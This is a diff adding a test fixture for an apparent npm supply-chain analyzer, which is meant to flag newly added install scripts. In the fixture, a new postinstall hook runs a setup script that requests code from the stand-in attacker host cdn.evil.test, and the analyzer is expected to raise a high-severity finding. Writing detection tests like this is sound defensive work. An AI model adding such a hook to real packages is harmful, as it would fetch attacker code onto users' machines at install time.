@@ -1,0 +1,10 @@
+eco: npm
+note: 'b10: a new postinstall runs a script (the code it runs is analysed once the analyzer is linked)'
+old: {index.js: "module.exports = 1;\n"}
+new: {index.js: "module.exports = 1;\n", scripts/setup.js: "require('https').get('https://cdn.evil.test/p.js');\n"}
+features_old: []
+features_new: []
+meta_old: {scripts: {test: jest}}
+meta_new: {scripts: {test: jest, postinstall: node scripts/setup.js}}
+expect:
+- {id: npm-install-script-new, min_severity: high}
